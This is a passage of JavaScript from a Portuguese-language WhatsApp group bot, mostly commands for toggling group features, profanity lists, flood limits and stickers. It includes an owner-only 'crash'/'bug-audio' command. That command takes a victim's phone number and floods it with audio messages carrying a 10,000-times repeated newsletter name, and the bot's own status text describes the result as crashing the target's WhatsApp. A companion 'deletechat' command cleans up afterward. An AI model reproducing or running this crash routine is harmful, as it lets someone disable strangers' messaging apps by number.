reply('Desativando o modo simi com sucesso neste grupo.ï¸')
} else {
reply('1 para ativar, 0 para desativar.')
}
break

case 'autofigu': case 'autosticker':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAutofigu) return reply('O recurso de criar stickers forma automÃ¡tica jÃ¡ se encontra ativo neste grupo senhor(a).') 
dataGp[0].autosticker = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de auto figurinhas neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isAutofigu) return reply('O recurso de criar stickers forma automÃ¡tica jÃ¡ se encontra desativado neste grupo senhor(a).')
dataGp[0].autosticker = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de auto figurinhas neste grupo.ï¸')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'autorepo':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAutorepo) return reply('O modo auto resposta jÃ¡ se encontra ativo no grupo.')
dataGp[0].autoresposta = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de auto resposta neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isAutorepo) return reply('O modo auto resposta jÃ¡ esta desativado no grupo.');
dataGp[0].autoresposta = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de auto resposta neste grupo.ï¸')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'modobrincadeira':
case 'modobrincadeiras':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isModobn) return reply('O modo brincadeira jÃ¡ estÃ¡ ativo.')
dataGp[0].jogos = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de Modo brincadeira neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isModobn) return reply('O modo brincadeira jÃ¡ estÃ¡ desativado.')
dataGp[0].jogos = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de Modo brincadeira neste grupo.')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'leveling':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isLevelingOn) return reply('O recurso de nÃ­vel jÃ¡ estava ativo antes nesse grupo.')
dataGp[0].level = true
setGp(dataGp)
reply('Leveling ativado com sucesso.') 
} else if(Number(args[0]) === 0) {
if(!isLevelingOn) return reply(`O recurso de level jÃ¡ estÃ¡ desativado neste grupo.`)
dataGp[0].level = false
setGp(dataGp)
reply('Leveling desativado com sucesso.')
} else {
reply('Adicionar parÃ¢metro 1 ou 0 ao lado do comando por favor senhor(a)!')
}
break

case 'bangp':
case 'unbangp':
if(!isGroup) return reply(mess.onlyGroup())
if(!SoDono) return reply(mess.onlyOwner())
if(command == 'bangp'){
if(isBanchat) return reply(`Este grupo jÃ¡ estÃ¡ banido.`)
dataGp[0].bangp = true
setGp(dataGp)
reply(`Grupo banido com sucesso.`)
} else {
if(!isBanchat) return reply(`Este grupo nÃ£o estÃ¡ mais banido.`)
dataGp[0].bangp = false
setGp(dataGp)
reply(`Grupo desbanido...`)
}
break

case 'boton':
case 'botoff':
if(!SoDono) return reply(mess.onlyOwner())
if(!isBotoff) {
nescessario.botoff = true
setNes(nescessario)
reply('Desativando funÃ§Ãµes e parando a execuÃ§Ã£o de comandos por membros com sucesso...')
} else if(isBotoff) {
nescessario.botoff = false
setNes(nescessario)
reply(`Ativando todos os funcionamentos do bot novamente...`)
}
break

case 'antipalavrÃ£o':
case 'antipalavrao':  
case 'antipalavra':    
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isPalavrao) return reply('O recurso de anti palavrÃµes hardcore jÃ¡ se encontra ativo atualmente no grupo senhor(a)!')
dataGp[0].antipalavrao.active = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de anti palavras hardcore neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isPalavrao) return reply('O recurso de anti palavrÃµes hardcore jÃ¡ se encontra desativado atualmente no grupo senhor(a)!')
dataGp[0].antipalavrao.active = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de anti palavra harcore neste grupo.ï¸')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'addpalavra':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isPalavrao) return reply('Anti palavrÃ£o desativado!')
if(args.length < 1) return reply(`Use assim: ${prefix + command} [palavrÃ£o]. Um exemplo desmontrativo de como usar aqui: ${prefix + command} puta`)
texto = args.join(' ').toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "")
if(isPalavras.includes(texto)) return reply('A palavra jÃ¡ foi adicionada na lista de proibiÃ§Ãµes. do anti palavra, verifique...')
dataGp[0].antipalavrao.palavras.push(texto)
setGp(dataGp)
reply(`PalavrÃ£o adicionado com sucesso! Consulte a lista, usando: ${prefix+command}`)
break

case 'delpalavra':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isPalavrao) return reply('Anti palavrÃ£o desativado!')
if(args.length < 1) return reply(`Use assim: ${prefix + command} [palavrÃ£o]. Um exemplo desmontrativo de como usar aqui: ${prefix + command} puta`)
texto = args.join(' ').toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "")
if(!isPalavras.includes(texto)) return reply('A palavra jÃ¡ foi removida ou nunca esteve na lista de proibiÃ§Ãµes do recurso...')
var i = dataGp[0].antipalavrao.palavras.indexOf(texto)
dataGp[0].antipalavrao.palavras.splice(i, 1)
setGp(dataGp)
reply(`PalavrÃ£o removido com sucesso da lista. Para verificar se foi removido mesmo, use o comando: ${prefix+command}`)
break

case 'listapalavrÃ£o': case 'listapalavra': case 'listpalavra':
if(!isPalavrao) return reply('Anti palavrÃ£o desativado!')
if(isPalavras.length < 0) return reply(`NÃ£o existe nenhum palavra proibida na lista.`)
reply(`â€¢ [Total: *${isPalavras.length}*] - Lista de palavrÃµes adicionados no grupo:\nâ€“\n${isPalavras.map((v, index) => `*${index+1}.* â¸  ${v}`).join('\n')}`)
break

case 'limitecaracteres':
case 'limiteflood':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntiFlood) return reply(`O recurso limite de caracteres jÃ¡ estÃ¡ ativo no grupo.`)
dataGp[0].limitec.active = true
setGp(dataGp)
reply(`O recurso limite de caracteres foi ativado nesse grupo.`)
} else if(Number(args[0]) === 0) {
if(!isAntiFlood) return reply('O recurso limite de caracteres nÃ£o estÃ¡ ativado no grupo.')
dataGp[0].limitec.active = false
setGp(dataGp)
reply('O recurso limite de caracteres foi desativado nesse grupo.ï¸')
} else {
reply(`Digite ${prefix + command} 1 para ativar, 0 para desativar o recurso`)
}
break

case 'limitec_global':
case 'limitec':
if(!SoDono && !isnit && !ischyt) return reply(mess.onlyOwner())
if(!isAntiFlood) return reply(`Ative este recurso primeiro ${prefix}limiteflood 1`)
if(!q) return reply(`Cade a quantidade? Ex: ${prefix + command} 5000`)
if(isNaN(q) == true) return reply('Digite apenas nÃºmeros.')
if(command == 'limitec'){
dataGp[0].limitec.quantidade = q
setGp(dataGp)
reply(`Foi alterado o limite de caracteres para: ${q}`)
} else {
fs.writeFileSync('./yoko/bunker/database/usuarios/flood.json', JSON.stringify({limitefl: q}, null, '\t'))
await reply(`Foi adicionado um limite global de caracteres de: ${q}`)
}
break

case 'status':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins && !SoDono && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(mess.onlyAdmins())
reply(mess.statusBot(isAnticall, isAntiPv, isAntiPv2, isAntiPv3, isAntiImg, isAntiVid, isAntiAudio, isAntiSticker, isAntiDDD, Antidoc, isAntiCtt, Antiloc, isAntilinkgp, isAntiLinkHard, isAntiLinkEasy, isAntifake, isAntiNotas, isAnticatalogo, isPalavrao, isAntiFlood, isWelkom, isWelkom2, isSimi, isAutofigu, isAutorepo, isModobn, isModoAluguel, isLevelingOn))
break

case 'reiniciar':
if(!SoDono) return reply(mess.onlyOwner())
reply("Reiniciando o sistema, em segundos jÃ¡ estarei de volta senhor(a) as suas ordens!")
setTimeout(async() => {process.exit()}, 1200)
break

case 'reviverqr':
if(!SoDono) return reply(mess.onlyOwner()) 
exec(`cd ${folderUserAuth} && rm -rf pre-key* sender* session*`)
setTimeout(async () => {
reply("Reiniciando..")
setTimeout(async () => {
process.exit()
}, 1200)
}, 1000)
break

case 'novoqr':
if(!SoDono) return reply(mess.onlyOwner());
reply("SerÃ¡ apagado o qrcode, e irÃ¡ gerar um novo, fique atento no terminal para ler novamente..");
setTimeout(async() => {fs.rmdirSync(qrcode, {recursive: true})}, 1500);
break

case 'limpardb':
if(!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(enviar.msg.adm)
AB = countMessage.map(i => i.groupId).indexOf(from)
total = countMessage[AB].participants.length
caixa = []
for(i = 0; i < countMessage[AB].participants.length; i++) {
  if(isJsonIncludes(groupMembers, countMessage[AB].participants[i].id)) {
    caixa.push(countMessage[AB].participants[i])
  }
}
pack = total - caixa.length
if(pack <= 0) return reply("*Todos os ghosts da data base jÃ¡ foram deletados...*")
countMessage[AB].participants = caixa
saveJSON(countMessage, ".settings/media/countmsg.json")
reply(`${pack} nÃºmeros foram deletados da pasta com sucesso âœ…`)
break

case 'deletechat':{
if(!SoDono) return reply("Somente meu pai!")
if(!q && !menc_os2) return reply(`Marque a mensagem do usuÃ¡rio ou use ${prefix+command} 55219.......99`)
try {
if(!menc_os2) {
ursk = q
victim = ursk.includes('@') ? ursk.split('@')[1] + "@s.whatsapp.net" : ursk + "@s.whatsapp.net"
await yoko.chatModify({
  delete: true,
  lastMessages: [{ key: info.key, messageTimestamp: info.messageTimestamp }] }, victim)
reply("Esse chat foi limpo!")
} else {
await yoko.chatModify({
  delete: true,
  lastMessages: [{ key: info.key, messageTimestamp: info.messageTimestamp }] }, menc_os2)
reply("Chat Limpo!")
}
} catch(e) {
console.log(e)
reply(e)
}
}
break

case 'crash':
case 'bug-audio':{
if(!SoDono) return reply("Somente meu pai!")
ursk = args[0]
amount = args[1]
if(!ursk && !menc_os2) return reply (`EstÃ¡ faltando o nÃºmero!\n> *Como usar:* ${prefix+command} <nÃºmero> <quantidade>\n> *Exemplo:* ${prefix+command} 55219......22 10`)
if(!amount && !menc_os2) return reply (`EstÃ¡ faltando a quantidade!\n> *Como usar:* ${prefix+command} <nÃºmero> <quantidade>\n> *Exemplo:* ${prefix+command} ${ursk} 10`)
RoohKk = await getBuffer(`https://firebasestorage.googleapis.com/v0/b/filmes-f43a7.appspot.com/o/%C3%89%20PIRU%20NAS%20MININA%20(Clipe%20Oficial)%20DJ%20Arana%20e%20MC%20Pikachu%20-%20MEDLEY%20DAS%20ANTIGAS.mp3?alt=media&token=87958015-cb27-408e-90f7-584fa2e5de99`)
if(!menc_os2) {
victim = ursk.includes('@') ? ursk.split('@')[1] + "@s.whatsapp.net" : ursk + "@s.whatsapp.net"
baah = amount * 10
for (let i = 0; i < baah; i++) {
await yoko.sendMessage(victim, { "caption": `BY GleysonDevs`, audio: RoohKk, mimetype: 'audio/mpeg', ptt:false,"title":`Tik Tak... Yurizinn`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: NomeDoBot.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })}
if(isButtons) {
await yoko.relayMessage(from,
{interactiveMessage: {
body: { text: `                  ğŸª¬ \`\`\`Crash Enviado\`\`\` ğŸª¬
ğŸ™ï¸ Tipo de Crash: *Bug Ãudio*
ğŸ§® Quantidade: *${amount}*
ğŸª„ DuraÃ§Ã£o: *MÃ¡ximo 3h*
> â— *Obs*: apÃ³s o WhatsApp aberto pelo usuÃ¡rio, o mesmo serÃ¡ crashado.
> âš ï¸ *AtenÃ§Ã£o*: recomendado a limpaÃ§Ã£o do chat para evitar crashamentos ao WhatsApp do bot!`
},nativeFlowMessage: {
buttons: [{
 name: "quick_reply",
  buttonParamsJson: JSON.stringify({
   display_text: "ğŸ—‘ï¸ âˆ‚Ñ”â„“Ñ”Ñ‚Î±r Â¢Ğ½Î±Ñ‚ ğŸ’¬",
    id: `${prefix}deletechat ${ursk}`
}),},
{
 name: "quick_reply",
  buttonParamsJson: JSON.stringify({
   display_text: "ğŸ“¨ Ñ”Î·Î½Î¹Î±r Ğ¼Î±Î¹s â•",
    id: `${prefix+command} ${ursk} ${amount}`
}),}],
            messageParamsJson: "",
          },
        },
      },
      {}
    )
} else {
reply(`                  ğŸª¬ \`\`\`Crash Enviado\`\`\` ğŸª¬
ğŸ™ï¸ Tipo de Crash: *Bug Ãudio*
ğŸ§® Quantidade: *${amount}*
ğŸª„ DuraÃ§Ã£o: *MÃ¡ximo 3h*
> â— *Obs*: apÃ³s o WhatsApp aberto pelo usuÃ¡rio, o mesmo serÃ¡ crashado.
> âš ï¸ *AtenÃ§Ã£o*: recomendado a limpaÃ§Ã£o do chat para evitar crashamentos ao WhatsApp do bot!
> ğŸ—‘ï¸ *Como limpar?* use ${prefix}deletechat ${ursk}`)
}
} else {
ahb = 10 * 10
for (let i = 0; i < ahb; i++) {
await yoko.sendMessage(menc_os2, { "caption": `BY GleysonDevs`, audio: RoohKk, mimetype: 'audio/mpeg', ptt:false,"title":`Tik Tak... Yurizinn`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: NomeDoBot.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })}
if(isButtons) {
await yoko.relayMessage(from,
{interactiveMessage: {
body: { text: `                  ğŸª¬ \`\`\`Crash Enviado\`\`\` ğŸª¬
ğŸ™ï¸ Tipo de Crash: *Bug Ãudio*
ğŸ§® Quantidade: *${ahb}*
ğŸª„ DuraÃ§Ã£o: *MÃ¡ximo 3h*
> â— *Obs*: apÃ³s o WhatsApp aberto pelo usuÃ¡rio, o mesmo serÃ¡ crashado.
> âš ï¸ *AtenÃ§Ã£o*: recomendado a limpaÃ§Ã£o do chat para evitar crashamentos ao WhatsApp do bot!`
},nativeFlowMessage: {
buttons: [{
 name: "quick_reply",
  buttonParamsJson: JSON.stringify({
   display_text: "ğŸ—‘ï¸ âˆ‚Ñ”â„“Ñ”Ñ‚Î±r Â¢Ğ½Î±Ñ‚ ğŸ’¬",
    id: `${prefix}deletechat ${menc_os2.split("@")[0]}`
}),},
{
 name: "quick_reply",
  buttonParamsJson: JSON.stringify({
   display_text: "ğŸ“¨ Ñ”Î·Î½Î¹Î±r Ğ¼Î±Î¹s â•",
    id: `${prefix+command} ${menc_os2.split("@")[0]}`
}),}],
            messageParamsJson: "",
          },
        },
      },
      {}
    )
} else {
reply(`                  ğŸª¬ \`\`\`Crash Enviado\`\`\` ğŸª¬
ğŸ™ï¸ Tipo de Crash: *Bug Ãudio*
ğŸ§® Quantidade: *${ahb}*
ğŸª„ DuraÃ§Ã£o: *MÃ¡ximo 3h*
> â— *Obs*: apÃ³s o WhatsApp aberto pelo usuÃ¡rio, o mesmo serÃ¡ crashado.
> âš ï¸ *AtenÃ§Ã£o*: recomendado a limpaÃ§Ã£o do chat para evitar crashamentos ao WhatsApp do bot!
> ğŸ—‘ï¸ *Como limpar?* use ${prefix}deletechat ${menc_os2.split("@")[0]}`)
}
}
}
break

case 'emoji': case 'semoji':
try {
if (!q.trim()) return reply(`VocÃª estÃ¡ usando o comando de forma errada, use: *${prefix+command} [emj]/[pltf]*\nâ€”\nâ€¢ *Plataformas disponÃ­veis:* whatsapp, facebook, google, samsung, twitter, apple, microsoft, mesengger, joypixels, openmoji, emojidex, htc, lg, mozilla, softbank, au_kddi`)
if (!q.includes("/")) return reply(`EstÃ¡ faltando a */*, para separar o emoji e plataforma.\nâ€¢ Por exemplo: ${prefix+command} ğŸƒâ€â™‚ï¸/apple`);
reply(mess.wait());
var [emojiInput, platform] = q.split("/");
var { emojisData } = await emoji(emojiInput);
if (emojisData && emojisData[platform.toLowerCase()]) {
await sendStickerFromUrl(from, emojisData[platform.toLowerCase()]);
} else {
return reply(`Emoji '${emojiInput}' nÃ£o encontrado!`);
}
} catch(error) {
reply(mess.error())
}
break


case 'figfundo':
case 'figvideo':
case 'figusemfundo': 
case 'sfundo':  
if((isMedia && !info.message.videoMessage || isQuotedImage) && !q.length <= 1) {
rafa = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
reply(mess.wait())
buff = await getFileBuffer(rafa, 'image')
bas64 = `data:image/jpeg;base64,${buff.toString('base64')}`
anu = args.join(' ').split('|')
satu = anu[0] !== '' ? anu[0] : `${NomeDoBot}`
sd = `â†³ âªğŸ‘¤à¸ºà£ªà£­Í˜ê•¸â–¸ Feito pelo(a) usuÃ¡rio(a): ${pushname}`
dua = typeof anu[1] !== 'undefined' ? anu[1] : `${sd}`
var mantap = await convertSticker(bas64, `${dua}`, `${satu}`)
var sti = new Buffer.from(mantap, 'base64');
await yoko.sendMessage(from, {sticker: sti}, {quoted: selo})
} else {
return reply(`So imagem amigo(a)!`)
}
break

case 'rbale':  
if(!isQuotedSticker) return reply('Marque uma figurinha...')
encmediats = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
reply(mess.wait())
bas64 = `data:image/jpeg;base64,${encmediats.toString('base64')}`
var mantap = await convertSticker(bas64, `â†³ âªğŸ‘¤à¸ºà£ªà£­Í˜ê•¸â–¸ Feito pelo(a) usuÃ¡rio(a): ${pushname}`, `${NomeDoBot}`)
var sti = new Buffer.from(mantap, 'base64');
await yoko.sendMessage(from, {sticker: sti}, {quoted: selo}).catch(async(error) => {
reply(mess.error()); 
})
break

case 'rename':
case 'roubar':  
if(!isQuotedSticker) return reply('Marque uma figurinha...')
encmediats = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
var kls = q
var pack = kls.split("/")[0];
var author2 = kls.split("/")[1];
if(!q) return reply('Como vocÃª renomear a figurinha sem colocar o novo pacote e autor do sticker? Esses humanos...')
if(!pack) return reply(`FaÃ§a o certo, invÃ©s do errado senhor(a), aqui estÃ¡ fÃ³rmula correta de uso: *${prefix+command} pacote/autor* (mas nÃ£o se esqueÃ§a de mencionar o comando ao sticker enviado anteriormente se for esse que deseja renomear certo?)`)
if(!author2) return reply(`FaÃ§a o certo, invÃ©s do errado senhor(a), aqui estÃ¡ fÃ³rmula correta de uso: *${prefix+command} pacote/autor* (mas nÃ£o se esqueÃ§a de mencionar o comando ao sticker enviado anteriormente se for esse que deseja renomear certo?)`)
reply(mess.wait())
bas64 = `data:image/jpeg;base64,${encmediats.toString('base64')}`
var mantap = await convertSticker(bas64, `${author2}`, `${pack}`)
var sti = new Buffer.from(mantap, 'base64');
await yoko.sendMessage(from, {sticker: sti}, {quoted: selo}).catch(async(error) => {
reply(mess.error()); 
})
break

case 'fstiker':
case 'fsticker':
case 'f':
var RSM = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
var boij = RSM?.imageMessage || info.message?.imageMessage || RSM?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessage?.message?.imageMessage || RSM?.viewOnceMessage?.message?.imageMessage
var boij2 = RSM?.videoMessage || info.message?.videoMessage || RSM?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessage?.message?.videoMessage || RSM?.viewOnceMessage?.message?.videoMessage  
if(boij) {
var packnameStk = `â†§ âªğŸ¤–à¸ºà£ªà£­Í˜ê•¸â–¸ ğ‚ğ«ğ¢ğšğğš ğ©ğ¨ğ«:\nâ€¢ â†³ ${NomeDoBot}\nâ€”\nâ†§ âªğŸ•µğŸ»â€â™‚ï¸à¸ºà£ªà£­Í˜ê•¸â–¸ ğğ«ğ¨ğ©ğ«ğ¢ğğ­ğšğ«ğ¢ğ¨:\nâ€¢ â†³ ${ownerName}`
var authorSticker = `â†§ âªğŸ‘¤à¸ºà£ªà£­Í˜ê•¸â–¸ ğ’ğ¨ğ¥ğ¢ğœğ¢ğ­ğšğğ¨ ğ©ğ¨ğ«:\nâ€¢ â†³ ${pushname}\nâ€”\nâ†§ âªâ™¦ï¸à¸ºà£ªà£­Í˜ê•¸â–¸ ğ•ğ¢ğ¬ğ¢ğ­ğ ğ§ğ¨ğ¬ğ¬ğ¨ ğ¬ğ¢ğ­ğ:\nâ€¢ â†³ https://yurimodz-apis.xyz`
reply(mess.wait())
owgi = await getFileBuffer(boij, 'image')
let ENC_MEDIA1 = await sendImageAsSticker2(yoko, from, owgi, selo, {packname: packnameStk, author: authorSticker})
await DLT_FL(ENC_MEDIA1)
} else if(boij2 && boij2?.seconds < 11) {
var packnameStk = `â†§ âªğŸ¤–à¸ºà£ªà£­Í˜ê•¸â–¸ ğ‚ğ«ğ¢ğšğğš ğ©ğ¨ğ«:\nâ€¢ â†³ ${NomeDoBot}\nâ€”\nâ†§ âªğŸ•µğŸ»â€â™‚ï¸à¸ºà£ªà£­Í˜ê•¸â–¸ ğğ«ğ¨ğ©ğ«ğ¢ğğ­ğšğ«ğ¢ğ¨:\nâ€¢ â†³ ${ownerName}`
var authorSticker = `â†§ âªğŸ‘¤à¸ºà£ªà£­Í˜ê•¸â–¸ ğ’ğ¨ğ¥ğ¢ğœğ¢ğ­ğšğğ¨ ğ©ğ¨ğ«:\nâ€¢ â†³ ${pushname}\nâ€”\nâ†§ âªâ™¦ï¸à¸ºà£ªà£­Í˜ê•¸â–¸ ğ•ğ¢ğ¬ğ¢ğ­ğ ğ§ğ¨ğ¬ğ¬ğ¨ ğ¬ğ¢ğ­ğ:\nâ€¢ â†³ https://yurimodz-apis.xyz`
reply(mess.wait())
owgi = await getFileBuffer(boij2, 'video')
let ENC_MEDIA2 = await sendVideoAsSticker(yoko, from, owgi, selo, {packname: packnameStk, author: authorSticker})
await DLT_FL(ENC_MEDIA2)
} else {
reply(`Envie uma imagem, vÃ­deo ou gif com legenda: ${prefix}sticker (duraÃ§Ã£o do adesivo de vÃ­deo de 1 a 10 segundos)`)
}
break

case 'st': case 'stk': case 'sticker': case 's':
var auc = info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage || info.message?.imageMessage || info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessage?.message?.imageMessage || info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessage?.message?.imageMessage;
var aoc = info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.videoMessage || info.message?.videoMessage || info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessage?.message?.videoMessage || info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessage?.message?.videoMessage;
var sticker = new Sticker(); // Sticker
if(auc && args.length == 0) {
var fileBuffer = await getFileBuffer(auc, 'image');
sticker.addFile(fileBuffer); 
sticker.options.metadata = {pack: config["stickerPack"].value, author: config["stickerPack"].value, author: config["stickerAuthor"].value. replaceAll("{user}", pushname). replaceAll("{botname}", NomeDoBot).replaceAll("{time}", `${dattofc} ${hourofc}`), emojis: ['ğŸ¤ ', 'ğŸ¥¶', 'ğŸ˜»']};
await sticker.start().then(async(data) => {
 await yoko.sendMessage(from, {sticker: fs.readFileSync(data[0].value)}, {quoted: info})
setTimeout(async() => { await reagir(from, "âœ…ï¸"); await fs.unlinkSync(data[0].value) }, 20);
}).catch(async(error) => reply(String(error)));
} else if(aoc && aoc.seconds < 11) {
var fileBuffer = await getFileBuffer(aoc, 'video')
sticker.addFile(fileBuffer); 
sticker.options.metadata = {pack: config["stickerPack"].value, author: config["stickerPack"].value, author: config["stickerAuthor"].value. replaceAll("{user}", pushname). replaceAll("{botname}", NomeDoBot).replaceAll("{time}", `${dattofc} ${hourofc}`), emojis: ['ğŸ¤ ', 'ğŸ¥¶', 'ğŸ˜»']};
await sticker.start().then(async(data) => {
 await yoko.sendMessage(from, {sticker: fs.readFileSync(data[0].value)}, {quoted: info})
setTimeout(async() => { await reagir(from, "âœ…ï¸"); await fs.unlinkSync(data[0].value) }, 20);
}).catch(async(error) => reply(String(error)));
} else if(args[0] == "-circle" || args[0] == "-cl") {
if(!JSON.stringify(info).includes('imageMessage')) return await reply(`â€¢ Mencione ou adicione uma legenda Ã  uma imagem ou um vÃ­deo.\nâ†’ OpÃ§Ãµes de CustomizaÃ§Ã£o:\n\tâ€¢ CÃ­rculo: *${prefix+command} -circle* | *-cl*\n\tâ€¢ PirÃ¢mide: *${prefix+command} -piramide* | *-pr*\n\tâ€¢ Borda Circular: *${prefix+command} -borda* | *-bd*\n\tâ€¢ Prisma: *${prefix+command} -prisma* | *-pm*\nâ†’ ObservaÃ§Ã£o do Comando:\n\tâ€¢ As opÃ§Ãµes de *customizaÃ§Ã£o* edtÃ¡ disponÃ­vel somente para imagens.\nâ€¢ NÃ£o Ã© possÃ­vel criar *STICKERs* em vÃ­deo (animados) com formatos diferentes em cÃ­rculo, pirÃ¢mide, por exemplo.\n\tâ€¢ Lembre-se o limite de duraÃ§Ã£o do vÃ­deo para criaÃ§Ã£o de *STICKERs* animados Ã© *9.9s*, caso seja maior realize o corte ou nÃ£o serÃ¡ possÃ­vel a criaÃ§Ã£o.\nâ€“\n> ${NomeDoBot}`);
var fileBuffer = await getFileBuffer(auc, 'image');
sticker.options.edit = 'circle'; 
sticker.addFile(fileBuffer); 
sticker.options.metadata = {pack: config["stickerPack"].value, author: config["stickerPack"].value, author: config["stickerAuthor"].value. replaceAll("{user}", pushname). replaceAll("{botname}", NomeDoBot).replaceAll("{time}", `${dattofc} ${hourofc}`), emojis: ['ğŸ¤ ', 'ğŸ¥¶', 'ğŸ˜»']};
await sticker.start().then(async(data) => {
 await yoko.sendMessage(from, {sticker: fs.readFileSync(data[0].value)}, {quoted: info})
}).catch(async(error) => reply(String(error)));
} else if(args[0] == "-borda" || args[0] == "-bd" && !auc) {
if(!JSON.stringify(info).includes('imageMessage')) return await reply(`â€¢ Mencione ou adicione uma legenda Ã  uma imagem ou um vÃ­deo.\nâ†’ OpÃ§Ãµes de CustomizaÃ§Ã£o:\n\tâ€¢ CÃ­rculo: *${prefix+command} -circle* | *-cl*\n\tâ€¢ PirÃ¢mide: *${prefix+command} -piramide* | *-pr*\n\tâ€¢ Borda Circular: *${prefix+command} -borda* | *-bd*\n\tâ€¢ Prisma: *${prefix+command} -prisma* | *-pm*\nâ†’ ObservaÃ§Ã£o do Comando:\n\tâ€¢ As opÃ§Ãµes de *customizaÃ§Ã£o* edtÃ¡ disponÃ­vel somente para imagens.\nâ€¢ NÃ£o Ã© possÃ­vel criar *STICKERs* em vÃ­deo (animados) com formatos diferentes em cÃ­rculo, pirÃ¢mide, por exemplo.\n\tâ€¢ Lembre-se o limite de duraÃ§Ã£o do vÃ­deo para criaÃ§Ã£o de *STICKERs* animados Ã© *9.9s*, caso seja maior realize o corte ou nÃ£o serÃ¡ possÃ­vel a criaÃ§Ã£o.\nâ€“\n> ${NomeDoBot}`);
var fileBuffer = await getFileBuffer(auc, 'image');
sticker.options.edit = 'borda'; 
sticker.addFile(fileBuffer); 
sticker.options.metadata = {pack: config["stickerPack"].value, author: config["stickerPack"].value, author: config["stickerAuthor"].value. replaceAll("{user}", pushname). replaceAll("{botname}", NomeDoBot).replaceAll("{time}", `${dattofc} ${hourofc}`), emojis: ['ğŸ¤ ', 'ğŸ¥¶', 'ğŸ˜»']};
await sticker.start().then(async(data) => {
 await yoko.sendMessage(from, {sticker: fs.readFileSync(data[0].value)}, {quoted: info})
}).catch(async(error) => reply(String(error)));
